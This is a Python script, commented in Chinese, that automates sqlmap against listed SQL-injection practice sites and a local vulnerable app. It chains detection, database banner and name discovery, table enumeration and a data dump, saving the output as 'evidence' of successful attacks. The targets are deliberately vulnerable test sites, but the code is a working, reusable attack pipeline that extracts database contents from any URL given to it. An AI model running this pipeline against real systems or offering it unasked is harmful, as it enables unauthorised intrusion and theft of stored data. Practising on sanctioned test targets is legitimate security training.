#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
真实SQLMap漏洞猎手 - 寻找真实的SQL注入漏洞
Real SQLMap Hunter - Find Real SQL Injection Vulnerabilities
"""

import subprocess
import json
import os
import time
from datetime import datetime
import requests

class RealSQLMapHunter:
    def __init__(self):
        # 已知存在SQL注入的测试目标（这些是专门用于安全测试的网站）
        self.test_targets = [
            {
                "name": "TestPHP VulnWeb",
                "url": "http://testphp.vulnweb.com/artists.php?artist=1",
                "parameter": "artist",
                "description": "经典的SQL注入测试站点"
            },
            {
                "name": "ZeroBank",
                "url": "http://zero.webappsecurity.com/bank/queryxpath.aspx?query=foo",
                "parameter": "query",
                "description": "另一个SQL注入测试平台"
            },
            {
                "name": "Juice Shop",
                "url": "http://127.0.0.1:3000/rest/products/search?q=",
                "parameter": "q",
                "description": "OWASP Juice Shop (如果本地运行)"
            }
        ]

        # 我们自己创建的易受攻击的应用
        self.local_targets = [
            {
                "name": "本地漏洞应用",
                "url": "http://127.0.0.1:5000/user?id=1",
                "parameter": "id",
                "description": "我们自己创建的漏洞应用"
            }
        ]

        self.successful_attacks = []
        self.output_dir = f"real_sqlmap_hunts_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        os.makedirs(self.output_dir, exist_ok=True)

    def hunt_real_sql_injections(self):
        """寻找真实的SQL注入漏洞"""
        print("=" * 80)
        print("真实SQLMap漏洞猎手")
        print("目标: 寻找真实的、可验证的SQL注入漏洞")
        print("=" * 80)
        print(f"输出目录: {self.output_dir}")
        print("=" * 80)

        # 首先测试本地漏洞应用
        print("\n🎯 测试本地漏洞应用...")
        self._test_local_targets()

        # 然后测试已知的公开测试目标
        print("\n🎯 测试公开SQL注入测试目标...")
        self._test_public_targets()

        # 生成最终报告
        self._generate_hunt_report()

    def _test_local_targets(self):
        """测试本地目标"""
        for target in self.local_targets:
            print(f"\n{'='*60}")
            print(f"测试本地目标: {target['name']}")
            print(f"URL: {target['url']}")
            print(f"参数: {target['parameter']}")
            print(f"描述: {target['description']}")
            print(f"{'='*60}")

            # 首先检查目标是否可达
            if not self._check_target_availability(target['url']):
                print(f"[跳过] 目标不可达")
                continue

            # 执行SQLMap测试
            success = self._run_sqlmap_test(target, "local")

            if success:
                print(f"[SUCCESS] 发现真实SQL注入漏洞!")
                self.successful_attacks.append(target)

    def _test_public_targets(self):
        """测试公开目标"""
        for target in self.test_targets:
            print(f"\n{'='*60}")
            print(f"测试公开目标: {target['name']}")
            print(f"URL: {target['url']}")
            print(f"参数: {target['parameter']}")
            print(f"描述: {target['description']}")
            print(f"{'='*60}")

            # 检查目标是否可达
            if not self._check_target_availability(target['url']):
                print(f"[跳过] 目标不可达")
                continue

            # 执行SQLMap测试
            success = self._run_sqlmap_test(target, "public")

            if success:
                print(f"[SUCCESS] 发现真实SQL注入漏洞!")
                self.successful_attacks.append(target)

    def _check_target_availability(self, url):
        """检查目标是否可达"""
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                print(f"[可达] 目标响应正常 (HTTP {response.status_code})")
                return True
            else:
                print(f"[警告] 目标返回HTTP {response.status_code}")
                return False
        except Exception as e:
            print(f"[错误] 目标不可达: {e}")
            return False

    def _run_sqlmap_test(self, target, target_type):
        """执行SQLMap测试"""
        target_name = target['name'].replace(' ', '_')
        target_dir = os.path.join(self.output_dir, f"{target_name}_{target_type}")
        os.makedirs(target_dir, exist_ok=True)

        print(f"\n[SQLMap测试] 开始攻击 {target['url']}")

        # SQLMap基础检测命令
        cmd = [
            "sqlmap",
            "-u", target['url'],
            "-p", target['parameter'],
            "--batch",
            "--level=1",
            "--risk=1",
            "--random-agent",
            "--output-dir", target_dir,
            "--fresh-queries",
            "--timeout=30",
            "--retries=2"
        ]

        print(f"[命令] {' '.join(cmd)}")

        try:
            start_time = time.time()
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=120  # 2分钟超时
            )
            end_time = time.time()

            execution_time = end_time - start_time

            # 保存命令和输出
            with open(os.path.join(target_dir, "sqlmap_command.txt"), 'w') as f:
                f.write(f"目标: {target['name']}\n")
                f.write(f"URL: {target['url']}\n")
                f.write(f"参数: {target['parameter']}\n")
                f.write(f"执行时间: {execution_time:.2f}秒\n")
                f.write(f"命令: {' '.join(cmd)}\n")
                f.write("=" * 50 + "\n")
                f.write("STDOUT:\n")
                f.write(result.stdout)
                f.write("\n" + "=" * 50 + "\n")
                f.write("STDERR:\n")
                f.write(result.stderr)

            # 分析输出
            if result.returncode == 0:
                output = result.stdout.lower()

                # 检查是否发现SQL注入
                injection_indicators = [
                    "injection identified",
                    "parameter is injectable",
                    "sql injection detected",
                    "vulnerable to sql injection"
                ]

                found_injection = any(indicator in output for indicator in injection_indicators)

                if found_injection:
                    print(f"[发现] SQLMap检测到SQL注入漏洞!")
                    print(f"[时间] 执行时间: {execution_time:.2f}秒")

                    # 尝试获取基本信息
                    self._try_database_enumeration(target, target_dir)

                    return True
                else:
                    print(f"[未发现] 未检测到SQL注入漏洞")
                    print(f"[时间] 执行时间: {execution_time:.2f}秒")
                    return False
            else:
                print(f"[错误] SQLMap执行失败 (返回码: {result.returncode})")
                print(f"[错误信息] {result.stderr}")
                return False

        except subprocess.TimeoutExpired:
            print(f"[超时] SQLMap测试超时")
            return False
        except Exception as e:
            print(f"[异常] SQLMap测试异常: {e}")
            return False

    def _try_database_enumeration(self, target, target_dir):
        """尝试数据库枚举"""
        print(f"\n[数据库枚举] 尝试获取数据库信息...")

        # 获取数据库版本
        cmd_version = [
            "sqlmap",
            "-u", target['url'],
            "-p", target['parameter'],
            "--batch",
            "--level=1",
            "--risk=1",
            "--random-agent",
            "--banner",
            "--output-dir", target_dir,
            "--fresh-queries",
            "--timeout=30"
        ]

        try:
            print(f"[命令] 获取数据库版本...")
            result = subprocess.run(cmd_version, capture_output=True, text=True, timeout=60)

            if result.returncode == 0:
                output = result.stdout
                if "banner:" in output.lower() or "version" in output.lower():
                    print(f"[成功] 获取到数据库版本信息")

                    # 保存版本信息
                    with open(os.path.join(target_dir, "database_info.txt"), 'w') as f:
                        f.write(f"目标: {target['name']}\n")
                        f.write(f"数据库信息:\n")
                        f.write(output)

                    # 尝试获取当前数据库
                    self._try_current_database(target, target_dir)
                else:
                    print(f"[信息] 无法获取数据库版本")
            else:
                print(f"[失败] 获取数据库版本失败")

        except Exception as e:
            print(f"[异常] 数据库枚举异常: {e}")

    def _try_current_database(self, target, target_dir):
        """尝试获取当前数据库名"""
        print(f"[数据库名] 尝试获取当前数据库名...")

        cmd_db = [
            "sqlmap",
            "-u", target['url'],
            "-p", target['parameter'],
            "--batch",
            "--level=1",
            "--risk=1",
            "--random-agent",
            "--current-db",
            "--output-dir", target_dir,
            "--fresh-queries",
            "--timeout=30"
        ]

        try:
            result = subprocess.run(cmd_db, capture_output=True, text=True, timeout=60)

            if result.returncode == 0:
                output = result.stdout
                if "current database:" in output.lower() or "database:" in output.lower():
                    print(f"[成功] 获取到当前数据库名")

                    # 保存数据库信息
                    with open(os.path.join(target_dir, "current_database.txt"), 'w') as f:
                        f.write(f"目标: {target['name']}\n")
                        f.write(f"当前数据库:\n")
                        f.write(output)

                    # 尝试获取表列表
                    self._try_table_enumeration(target, target_dir)
                else:
                    print(f"[信息] 无法获取当前数据库名")
            else:
                print(f"[失败] 获取当前数据库名失败")

        except Exception as e:
            print(f"[异常] 获取数据库名异常: {e}")

    def _try_table_enumeration(self, target, target_dir):
        """尝试获取表列表"""
        print(f"[表枚举] 尝试获取数据表列表...")

        cmd_tables = [
            "sqlmap",
            "-u", target['url'],
            "-p", target['parameter'],
            "--batch",
            "--level=1",
            "--risk=1",
            "--random-agent",
            "--tables",
            "--output-dir", target_dir,
            "--fresh-queries",
            "--timeout=60"
        ]

        try:
            result = subprocess.run(cmd_tables, capture_output=True, text=True, timeout=120)

            if result.returncode == 0:
                output = result.stdout
                if "tables:" in output.lower() or "|" in output:
                    print(f"[成功] 获取到数据表列表")

                    # 保存表信息
                    with open(os.path.join(target_dir, "tables_list.txt"), 'w') as f:
                        f.write(f"目标: {target['name']}\n")
                        f.write(f"数据表列表:\n")
                        f.write(output)

                    # 尝试转储一个小表
                    self._try_dump_sample_data(target, target_dir)
                else:
                    print(f"[信息] 无法获取数据表列表")
            else:
                print(f"[失败] 获取数据表列表失败")

        except Exception as e:
            print(f"[异常] 表枚举异常: {e}")

    def _try_dump_sample_data(self, target, target_dir):
        """尝试转储样本数据"""
        print(f"[数据转储] 尝试转储样本数据...")

        # 尝试转储第一个表的前几行
        cmd_dump = [
            "sqlmap",
            "-u", target['url'],
            "-p", target['parameter'],
            "--batch",
            "--level=1",
            "--risk=1",
            "--random-agent",
            "--dump",
            "--limit=5",
            "--output-dir", target_dir,
            "--fresh-queries",
            "--timeout=90"
        ]

        try:
            result = subprocess.run(cmd_dump, capture_output=True, text=True, timeout=180)

            if result.returncode == 0:
                output = result.stdout
                if "table" in output.lower() and "dumped" in output.lower():
                    print(f"[成功] 成功转储样本数据!")

                    # 保存转储的数据
                    with open(os.path.join(target_dir, "dumped_data.txt"), 'w') as f:
                        f.write(f"目标: {target['name']}\n")
                        f.write(f"转储的数据:\n")
                        f.write(output)

                    print(f"[凭证] 真实SQLMap数据提取凭证已生成!")
                    print(f"[位置] {target_dir}/")
                else:
                    print(f"[信息] 无法转储数据")
            else:
                print(f"[失败] 数据转储失败")

        except Exception as e:
            print(f"[异常] 数据转储异常: {e}")

    def _generate_hunt_report(self):
        """生成狩猎报告"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"real_sqlmap_hunt_report_{timestamp}.json"

        report = {
            "hunt_summary": {
                "timestamp": timestamp,
                "tool": "Real SQLMap Hunter v1.0",
                "total_targets_tested": len(self.local_targets) + len(self.test_targets),
                "successful_attacks": len(self.successful_attacks),
                "output_directory": self.output_dir
            },
            "successful_targets": self.successful_attacks,
            "evidence_summary": {},
            "verification_commands": []
        }

        # 收集证据信息
        for attack in self.successful_attacks:
            target_name = attack['name'].replace(' ', '_')
            for target_type in ['local', 'public']:
                target_dir = os.path.join(self.output_dir, f"{target_name}_{target_type}")
                if os.path.exists(target_dir):
                    evidence_files = []
                    for file in os.listdir(target_dir):
                        if os.path.isfile(os.path.join(target_dir, file)):
                            evidence_files.append(file)

                    if evidence_files:
                        report["evidence_summary"][f"{target_name}_{target_type}"] = {
                            "directory": target_dir,
                            "evidence_files": evidence_files,
                            "target_info": attack
                        }

                        # 生成验证命令
                        report["verification_commands"].append({
                            "target": attack['name'],
                            "url": attack['url'],
                            "parameter": attack['parameter'],
                            "command": f"sqlmap -u \"{attack['url']}\" -p {attack['parameter']} --batch --level=1 --risk=1 --random-agent --output-dir {target_dir} --fresh-queries"
                        })

        # 保存报告
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, ensure_ascii=False, indent=2)

        print(f"\n{'='*80}")
        print(f"SQLMap漏洞狩猎完成!")
        print(f"{'='*80}")
        print(f"测试目标: {report['hunt_summary']['total_targets_tested']} 个")
        print(f"成功攻击: {report['hunt_summary']['successful_attacks']} 个")
        print(f"报告文件: {report_file}")
        print(f"证据目录: {self.output_dir}")

        if self.successful_attacks:
            print(f"\n🎯 成功发现SQL注入漏洞的目标:")
            for attack in self.successful_attacks:
                print(f"  - {attack['name']}: {attack['url']}")
            print(f"\n✅ 真实SQLMap凭证已生成!")
            print(f"✅ 所有攻击都可以重现验证!")
        else:
            print(f"\n❌ 未发现可利用的SQL注入漏洞")
            print(f"💡 建议: 检查目标网站或尝试不同的攻击向量")

def main():
    hunter = RealSQLMapHunter()
    hunter.hunt_real_sql_injections()

if __name__ == "__main__":
    main()